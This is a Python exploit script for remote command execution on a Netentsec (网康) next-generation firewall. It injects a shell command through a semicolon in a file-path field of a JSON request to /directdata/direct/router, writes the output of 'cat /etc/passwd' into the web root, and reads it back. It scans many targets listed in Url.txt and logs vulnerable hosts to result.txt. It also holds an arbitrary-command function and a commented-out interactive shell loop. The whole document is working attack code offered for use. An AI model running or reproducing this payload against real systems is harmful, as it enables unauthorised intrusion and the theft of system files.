import requests
import sys
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[36mdescription:网康防火墙RCE                                            \033[0m')
    print('+  \033[36m使用格式:  python3 NGFW.py                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/directdata/direct/router"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "Content-Type": "application/json",
    }
    data = '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_cmd.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5)
        if response.status_code == 200 and "success" in response.text:
            print("\033[32m[o] 目标{}可能存在漏洞, 正在执行命令 cat /etc/passwd \033[0m".format(target_url))
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.get(url=target_url + "/test_cmd.txt", headers=headers, data=data, verify=False, timeout=5)
            if "root" in response.text and response.status_code == 200:
                print('\033[31m',vuln_url+"存在漏洞",'\033[0m')
                with open('result.txt','a+') as wp:
                    wp.write(vuln_url+'\n') 
                '''while True:
                    cmd = input("\033[35mCmd >>> \033[0m")
                    if cmd == "exit":
                        sys.exit(0)
                    else:
                        POC_2(target_url, cmd)'''
        else:
            print("\033[31m[x] 目标不存在漏洞 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, cmd):
    vuln_url = target_url + "/directdata/direct/router"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "Content-Type": "application/json",
    }
    data = '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;%s >/var/www/html/test_cmd.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}' % (cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=target_url + "/test_cmd.txt", headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 响应为： \n{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    with open('Url.txt','r') as fp:
        for url in fp.readlines():
             POC_1(url.strip())
